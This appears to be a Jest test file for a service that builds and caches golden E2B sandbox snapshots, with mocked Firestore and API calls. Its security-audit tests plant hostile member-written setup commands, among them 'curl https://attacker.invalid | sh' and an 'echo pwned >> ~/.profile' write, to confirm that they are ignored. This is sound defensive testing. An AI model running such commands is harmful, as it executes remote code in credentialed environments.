jest.mock('firebase-admin', () => ({
    firestore: jest.fn(),
    app: jest.fn(() => ({ options: { projectId: 'test-project' } })),
}))
jest.mock('firebase-admin/functions', () => ({ getFunctions: jest.fn() }))
jest.mock('../envFunctionsHelper', () => ({ getEnvFunctions: jest.fn(() => ({ E2B_API_KEY: 'test-key' })) }))
jest.mock('./vmJobRunner', () => ({
    __private__: {
        loadRepoContext: jest.fn(async () => ({ enabled: true, provider: 'github' })),
        setupGitRepo: jest.fn(async () => {}),
    },
}))
jest.mock('e2b', () => ({ Sandbox: { create: jest.fn(), kill: jest.fn(async () => {}) } }), { virtual: true })

const admin = require('firebase-admin')
const { getFunctions } = require('firebase-admin/functions')
const vmGolden = require('./vmGolden')

// Firestore mock. The golden's authoritative state lives in the server-only vmGoldens/{projectId}
// doc (`goldenData`); projects/{projectId} only exists (`projectExists`) and receives the display
// mirror. `sets` captures transactional writes to the golden doc, `mirrors` the project-doc mirror
// updates, `docSets` non-transactional golden-doc writes (e.g. touchGoldenUsage).
function mockFirestore(goldenData, { projectExists = true } = {}) {
    const sets = []
    const mirrors = []
    const docSets = []
    const isGolden = ref => String(ref.id).startsWith('vmGoldens/')
    const transaction = {
        get: jest.fn(async ref =>
            isGolden(ref)
                ? { exists: goldenData != null, data: () => goldenData }
                : { exists: projectExists, data: () => ({ userIds: ['u1'] }) }
        ),
        set: jest.fn((ref, data) => {
            if (isGolden(ref)) sets.push(data)
        }),
        update: jest.fn((ref, data) => {
            if (!isGolden(ref)) mirrors.push(data)
        }),
    }
    admin.firestore.mockReturnValue({
        doc: jest.fn(path => ({
            id: path,
            get: jest.fn(async () =>
                path.startsWith('vmGoldens/')
                    ? { exists: goldenData != null, data: () => goldenData }
                    : { exists: projectExists, data: () => ({ userIds: ['u1'] }) }
            ),
            set: jest.fn(async data => {
                docSets.push({ path, data })
            }),
            update: jest.fn(async data => {
                mirrors.push(data)
            }),
        })),
        runTransaction: jest.fn(async cb => cb(transaction)),
    })
    return { sets, mirrors, docSets, transaction }
}

// Firestore mock for the cleanup scan: collection(name).where(...).get() → the given docs.
function mockFirestoreCleanup(goldenDocs) {
    const get = jest.fn(async () => ({ docs: goldenDocs }))
    const where = jest.fn(() => ({ get }))
    const collection = jest.fn(() => ({ where }))
    const mirrorUpdates = []
    admin.firestore.mockReturnValue({
        collection,
        doc: jest.fn(path => ({
            update: jest.fn(async data => {
                mirrorUpdates.push({ path, data })
            }),
        })),
    })
    return { where, collection, mirrorUpdates }
}

function buildCleanupDoc(id, golden) {
    return { id, data: () => golden, ref: { set: jest.fn(async () => {}) } }
}

function mockQueue() {
    const enqueue = jest.fn(async () => {})
    getFunctions.mockReturnValue({ taskQueue: jest.fn(() => ({ enqueue })) })
    return { enqueue }
}

beforeEach(() => {
    jest.clearAllMocks()
})

describe('sanitizeGoldenName', () => {
    it('lowercases and prefixes a plain id', () => {
        expect(vmGolden.sanitizeGoldenName('ABC123')).toBe('alldone-golden-abc123')
    })
    it('replaces unsafe characters with dashes and trims', () => {
        expect(vmGolden.sanitizeGoldenName('My Proj/x!')).toBe('alldone-golden-my-proj-x')
    })
    it('falls back when the id is empty', () => {
        expect(vmGolden.sanitizeGoldenName('')).toBe('alldone-golden-project')
    })
})

describe('hashLockfileContent', () => {
    it('is deterministic and content-sensitive', () => {
        const a = vmGolden.hashLockfileContent('{"a":1}')
        expect(a).toHaveLength(64)
        expect(vmGolden.hashLockfileContent('{"a":1}')).toBe(a)
        expect(vmGolden.hashLockfileContent('{"a":2}')).not.toBe(a)
    })
})

describe('resolveGoldenTemplate', () => {
    it('returns the snapshotId when ready', () => {
        expect(vmGolden.resolveGoldenTemplate({ vmGolden: { status: 'ready', snapshotId: 'team/g:1' } })).toBe(
            'team/g:1'
        )
    })
    it('returns null when not ready or missing', () => {
        expect(vmGolden.resolveGoldenTemplate({ vmGolden: { status: 'building', snapshotId: 'team/g:1' } })).toBeNull()
        expect(vmGolden.resolveGoldenTemplate({ vmGolden: { status: 'ready' } })).toBeNull()
        expect(vmGolden.resolveGoldenTemplate({})).toBeNull()
        expect(vmGolden.resolveGoldenTemplate(null)).toBeNull()
    })
})

describe('createGoldenSnapshot', () => {
    afterEach(() => {
        delete global.fetch
    })
    it('POSTs to the snapshot endpoint and returns the snapshotID', async () => {
        global.fetch = jest.fn(async () => ({ ok: true, json: async () => ({ snapshotID: 'team/g:2' }) }))
        const id = await vmGolden.createGoldenSnapshot('sbx-1', 'alldone-golden-p1', 'key')
        expect(id).toBe('team/g:2')
        const [url, opts] = global.fetch.mock.calls[0]
        expect(url).toBe('https://api.e2b.dev/sandboxes/sbx-1/snapshots')
        expect(opts.method).toBe('POST')
        expect(opts.headers['X-API-KEY']).toBe('key')
        expect(JSON.parse(opts.body)).toEqual({ name: 'alldone-golden-p1' })
    })
    it('throws on a non-ok response', async () => {
        global.fetch = jest.fn(async () => ({ ok: false, status: 500, text: async () => 'boom' }))
        await expect(vmGolden.createGoldenSnapshot('sbx-1', 'n', 'key')).rejects.toThrow(/E2B snapshot 500/)
    })
    it('throws when the response omits a snapshotID', async () => {
        global.fetch = jest.fn(async () => ({ ok: true, json: async () => ({}) }))
        await expect(vmGolden.createGoldenSnapshot('sbx-1', 'n', 'key')).rejects.toThrow(/did not include a snapshotID/)
    })
})

describe('claimGoldenRebuildLease', () => {
    it('claims when idle and writes a building lease', async () => {
        const { sets, mirrors } = mockFirestore({ status: 'ready', snapshotId: 'team/g:1' })
        const res = await vmGolden.claimGoldenRebuildLease('p1', 'u1', 'drift')
        expect(res.claimed).toBe(true)
        expect(res.buildId).toBeTruthy()
        expect(sets[0].rebuildState).toBe('building')
        expect(sets[0].rebuildLeaseOwner).toBe(res.buildId)
        // A pre-existing golden keeps its ready status while the new one builds.
        expect(sets[0].status).toBe('ready')
        // The project doc only gets the display mirror — never the snapshot pointer.
        expect(mirrors[0]['vmGolden.rebuildState']).toBe('building')
        expect(mirrors[0]['vmGolden.hasSnapshot']).toBe(true)
        expect(mirrors[0]['vmGolden.snapshotId']).toBeNull()
    })
    it('refuses when a live lease is already held', async () => {
        mockFirestore({ rebuildState: 'building', rebuildLeaseExpiresAt: Date.now() + 60000 })
        const res = await vmGolden.claimGoldenRebuildLease('p1', 'u1', 'drift')
        expect(res.claimed).toBe(false)
    })
    it('claims when the prior lease has expired', async () => {
        const { sets } = mockFirestore({ rebuildState: 'building', rebuildLeaseExpiresAt: Date.now() - 1000 })
        const res = await vmGolden.claimGoldenRebuildLease('p1', 'u1', 'drift')
        expect(res.claimed).toBe(true)
        expect(sets[0].rebuildState).toBe('building')
    })
    it('does not claim a missing project doc', async () => {
        mockFirestore(null, { projectExists: false })
        const res = await vmGolden.claimGoldenRebuildLease('p1', 'u1', 'drift')
        expect(res.claimed).toBe(false)
    })
})

describe('maybeTriggerGoldenRebuild', () => {
    it('does nothing when the golden is ready and the lockfile matches', async () => {
        const { enqueue } = mockQueue()
        mockFirestore({ status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' })
        const res = await vmGolden.maybeTriggerGoldenRebuild({
            projectId: 'p1',
            requestUserId: 'u1',
            project: { vmGolden: { status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' } },
            currentLockfileHash: 'abc',
        })
        expect(res.triggered).toBe(false)
        expect(enqueue).not.toHaveBeenCalled()
    })

    it('triggers exactly one rebuild when the lockfile drifted', async () => {
        const { enqueue } = mockQueue()
        mockFirestore({ status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' })
        const res = await vmGolden.maybeTriggerGoldenRebuild({
            projectId: 'p1',
            requestUserId: 'u1',
            project: { vmGolden: { status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' } },
            currentLockfileHash: 'xyz',
        })
        expect(res.triggered).toBe(true)
        expect(enqueue).toHaveBeenCalledTimes(1)
    })

    it('triggers a build when no golden exists yet', async () => {
        const { enqueue } = mockQueue()
        mockFirestore({})
        const res = await vmGolden.maybeTriggerGoldenRebuild({
            projectId: 'p1',
            requestUserId: 'u1',
            project: { vmGolden: {} },
            currentLockfileHash: 'xyz',
        })
        expect(res.triggered).toBe(true)
        expect(enqueue).toHaveBeenCalledTimes(1)
    })

    it('does not trigger when a rebuild lease is already held', async () => {
        const { enqueue } = mockQueue()
        mockFirestore({ rebuildState: 'building', rebuildLeaseExpiresAt: Date.now() + 60000 })
        const res = await vmGolden.maybeTriggerGoldenRebuild({
            projectId: 'p1',
            requestUserId: 'u1',
            project: { vmGolden: { status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' } },
            currentLockfileHash: 'xyz',
        })
        expect(res.triggered).toBe(false)
        expect(enqueue).not.toHaveBeenCalled()
    })

    it('stamps lastUsedAt (not a rebuild) when the golden is fresh and used', async () => {
        mockQueue()
        const { docSets } = mockFirestore({ status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' })
        await vmGolden.maybeTriggerGoldenRebuild({
            projectId: 'p1',
            requestUserId: 'u1',
            project: { vmGolden: { status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' } },
            currentLockfileHash: 'abc',
        })
        expect(docSets.length).toBe(1)
        expect(docSets[0].path).toBe('vmGoldens/p1')
        expect(docSets[0].data.lastUsedAt).toBeGreaterThan(0)
    })

    it('force triggers a rebuild even when the golden looks fresh', async () => {
        const { enqueue } = mockQueue()
        mockFirestore({ status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' })
        const res = await vmGolden.maybeTriggerGoldenRebuild({
            projectId: 'p1',
            requestUserId: 'u1',
            project: { vmGolden: { status: 'ready', snapshotId: 'team/g:1', lockfileHash: 'abc' } },
            currentLockfileHash: 'abc',
            force: true,
        })
        expect(res.triggered).toBe(true)
        expect(enqueue).toHaveBeenCalledTimes(1)
    })
})

describe('deleteGoldenSnapshot', () => {
    afterEach(() => {
        delete global.fetch
    })
    it('DELETEs the template and returns true', async () => {
        global.fetch = jest.fn(async () => ({ ok: true, status: 200 }))
        const res = await vmGolden.deleteGoldenSnapshot('team/g:1', 'key')
        expect(res).toBe(true)
        const [url, opts] = global.fetch.mock.calls[0]
        expect(url).toBe(`https://api.e2b.dev/templates/${encodeURIComponent('team/g:1')}`)
        expect(opts.method).toBe('DELETE')
        expect(opts.headers['X-API-KEY']).toBe('key')
    })
    it('treats 404 as already gone (false, no throw)', async () => {
        global.fetch = jest.fn(async () => ({ ok: false, status: 404 }))
        await expect(vmGolden.deleteGoldenSnapshot('team/g:1', 'key')).resolves.toBe(false)
    })
    it('throws on other errors', async () => {
        global.fetch = jest.fn(async () => ({ ok: false, status: 500, text: async () => 'boom' }))
        await expect(vmGolden.deleteGoldenSnapshot('team/g:1', 'key')).rejects.toThrow(/E2B delete template 500/)
    })
})

describe('cleanupUnusedVmGoldenSnapshots', () => {
    afterEach(() => {
        delete global.fetch
    })
    it('deletes stale snapshots and resets the project pointer', async () => {
        global.fetch = jest.fn(async () => ({ ok: true, status: 200 }))
        const stale = buildCleanupDoc('p1', { status: 'ready', snapshotId: 'team/g:1', lastUsedAt: 1 })
        const { collection, mirrorUpdates } = mockFirestoreCleanup([stale])
        const stats = await vmGolden.cleanupUnusedVmGoldenSnapshots({ now: Date.now() })
        // Scans the server-only collection, never snapshot ids from project docs.
        expect(collection).toHaveBeenCalledWith('vmGoldens')
        expect(stats.deleted).toBe(1)
        expect(stale.ref.set).toHaveBeenCalledTimes(1)
        expect(stale.ref.set.mock.calls[0][0].snapshotId).toBeNull()
        expect(stale.ref.set.mock.calls[0][0].deletedReason).toBe('unused_ttl')
        expect(mirrorUpdates[0]).toEqual(
            expect.objectContaining({
                path: 'projects/p1',
                data: expect.objectContaining({ 'vmGolden.status': 'idle' }),
            })
        )
    })
    it('skips a golden that is mid-rebuild', async () => {
        global.fetch = jest.fn(async () => ({ ok: true, status: 200 }))
        const building = buildCleanupDoc('p2', {
            status: 'ready',
            snapshotId: 'team/g:2',
            rebuildState: 'building',
            lastUsedAt: 1,
        })
        mockFirestoreCleanup([building])
        const stats = await vmGolden.cleanupUnusedVmGoldenSnapshots({ now: Date.now() })
        expect(stats.deleted).toBe(0)
        expect(global.fetch).not.toHaveBeenCalled()
        expect(building.ref.set).not.toHaveBeenCalled()
    })
})

// security audit 2026-11 (vmGolden:member-writable-setupCommand-snapshotId-seeds-credentialed-
// sandboxes): every member's cold coding job boots from the golden, so its build command and its
// snapshot pointer must come from the server-only vmGoldens doc, never the member-writable project.
describe('the golden is server-owned (security audit 2026-11)', () => {
    afterEach(() => {
        delete global.fetch
    })

    function mockBuildFirestore({ projectVmGolden, golden }) {
        const writes = []
        admin.firestore.mockReturnValue({
            doc: jest.fn(path => ({
                id: path,
                get: jest.fn(async () =>
                    path.startsWith('vmGoldens/')
                        ? { exists: golden != null, data: () => golden }
                        : { exists: true, data: () => ({ userIds: ['u1'], vmGolden: projectVmGolden }) }
                ),
                set: jest.fn(async data => writes.push({ path, op: 'set', data })),
                update: jest.fn(async data => writes.push({ path, op: 'update', data })),
            })),
            runTransaction: jest.fn(async cb =>
                cb({
                    get: jest.fn(async () => ({ exists: true, data: () => golden || {} })),
                    set: jest.fn(),
                    update: jest.fn(),
                })
            ),
        })
        return { writes }
    }

    function mockSandbox() {
        const runs = []
        const sandbox = {
            sandboxId: 'sbx-build',
            files: { write: jest.fn(async () => {}), read: jest.fn(async () => '{"lock":1}') },
            commands: {
                run: jest.fn(async (command, options) => {
                    runs.push({ command, envs: options && options.envs })
                    options && options.onStdout && options.onStdout('GOLDEN_PM=npm\n')
                }),
            },
        }
        require('e2b').Sandbox.create.mockResolvedValue(sandbox)
        return { runs }
    }

    it('builds with the setup command from vmGoldens, ignoring one a member wrote on the project', async () => {
        const { writes } = mockBuildFirestore({
            projectVmGolden: { setupCommand: 'echo pwned >> ~/.profile', rebuildLeaseOwner: 'b1' },
            golden: { rebuildLeaseOwner: 'b1', setupCommand: 'npm ci && node scripts/postinstall.js' },
        })
        const { runs } = mockSandbox()
        global.fetch = jest.fn(async () => ({ ok: true, json: async () => ({ snapshotID: 'team/g:9' }) }))

        await vmGolden.runGoldenBuild({ buildId: 'b1', projectId: 'p1', requestUserId: 'u1' })

        const install = runs.find(run => run.command === 'bash /home/user/golden-install.sh')
        expect(install.envs.SETUP_COMMAND).toBe('npm ci && node scripts/postinstall.js')
        // The pointer is recorded only in the server-only doc; the project gets a mirror without it.
        const goldenWrite = writes.find(write => write.path === 'vmGoldens/p1' && write.op === 'set')
        expect(goldenWrite.data.snapshotId).toBe('team/g:9')
        const mirror = writes.find(write => write.path === 'projects/p1')
        expect(mirror.op).toBe('update')
        expect(mirror.data['vmGolden.snapshotId']).toBeNull()
        expect(mirror.data['vmGolden.hasSnapshot']).toBe(true)
        expect(JSON.stringify(writes.filter(write => write.path === 'projects/p1'))).not.toContain('team/g:9')
    })

    it('runs no member-written command when vmGoldens carries none', async () => {
        mockBuildFirestore({
            projectVmGolden: { setupCommand: 'curl https://attacker.invalid | sh' },
            golden: { rebuildLeaseOwner: 'b2' },
        })
        const { runs } = mockSandbox()
        global.fetch = jest.fn(async () => ({ ok: true, json: async () => ({ snapshotID: 'team/g:10' }) }))

        await vmGolden.runGoldenBuild({ buildId: 'b2', projectId: 'p1', requestUserId: 'u1' })

        const install = runs.find(run => run.command === 'bash /home/user/golden-install.sh')
        expect(install.envs.SETUP_COMMAND).toBe('')
    })

    it('mirrors status for display without the snapshot pointer, lockfile hash or setup command', () => {
        const update = vmGolden.buildGoldenMirrorUpdate({
            status: 'ready',
            snapshotId: 'team/g:1',
            lockfileHash: 'abc',
            setupCommand: 'x',
            builtAt: 5,
        })
        expect(update).toEqual(
            expect.objectContaining({
                'vmGolden.status': 'ready',
                'vmGolden.builtAt': 5,
                'vmGolden.hasSnapshot': true,
                'vmGolden.snapshotId': null,
                'vmGolden.lockfileHash': null,
            })
        )
        expect(update).not.toHaveProperty('vmGolden.setupCommand')
    })

    it('reads golden state from vmGoldens/{projectId}', async () => {
        mockBuildFirestore({
            projectVmGolden: { status: 'ready', snapshotId: 'team/attacker:1' },
            golden: null,
        })
        await expect(vmGolden.readGoldenState('p1')).resolves.toBeNull()
    })
})
